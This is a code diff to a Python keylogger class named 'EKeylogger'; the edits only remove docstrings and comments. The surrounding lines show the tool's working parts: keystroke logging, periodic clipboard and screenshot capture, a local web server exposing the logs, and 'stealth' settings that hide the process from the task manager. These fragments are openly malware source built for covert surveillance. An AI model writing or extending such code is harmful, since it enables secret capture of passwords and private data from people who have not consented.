@@ -28,7 +28,6 @@ class EKeylogger:
         self.web_port = 8080
         
     def load_config(self):
-        """Load configuration from JSON file"""
         default_config = {
             "stealth": {
                 "hide_from_taskmanager": True,
@@ -55,7 +54,6 @@ class EKeylogger:
             self.config = default_config
             
     def save_config(self):
-        """Save configuration to JSON file"""
         try:
             with open(self.config_file, 'w') as f:
                 json.dump(self.config, f, indent=4)
@@ -63,14 +61,12 @@ class EKeylogger:
             print(f"Config saving error: {e}")
         
     def setup_directories(self):
-        """Create necessary directories"""
         if not os.path.exists(self.screenshot_dir):
             os.makedirs(self.screenshot_dir)
         if not os.path.exists(self.clipboard_dir):
             os.makedirs(self.clipboard_dir)
             
     def setup_logging(self):
-        """Setup logging configuration"""
         logging.basicConfig(
             filename=self.log_file,
             level=logging.DEBUG,
@@ -197,8 +193,6 @@ class EKeylogger:
             # Create server
             self.web_server = HTTPServer(('localhost', self.web_port), KeyloggerHandler)
             self.web_server.keylogger = self 
-            
-            # Start server in a separate thread
             server_thread = threading.Thread(target=self.web_server.serve_forever, daemon=True)
             server_thread.start()
             
@@ -225,7 +219,7 @@ class EKeylogger:
             logging.info(log_entry)
             print(f'Special: {key}')
             
-        # Capture clipboard periodically
+        # Capture clipboard 
         if self.key_count % self.clipboard_interval == 0:
             clipboard_path = self.capture_clipboard()
             if clipboard_path:
@@ -235,7 +229,6 @@ class EKeylogger:
         """Handle key release events"""
         if key == Key.esc:
             print("Keylogger stopped by user (ESC pressed)")
-            # Generate final clipboard report
             self.generate_clipboard_report()
             return False
             
@@ -243,7 +236,7 @@ class EKeylogger:
         print("EKeylogger Starting...")
         print("=" * 50)
         
-        # Apply stealth features
+        # Apply stealth
         if self.config['stealth']['hide_from_taskmanager']:
             print("Applying process hiding...")
             self.hide_from_taskmanager()
@@ -269,3 +262,4 @@ class EKeylogger:
 if __name__ == "__main__":        
     keylogger = EKeylogger()
     keylogger.start()
+
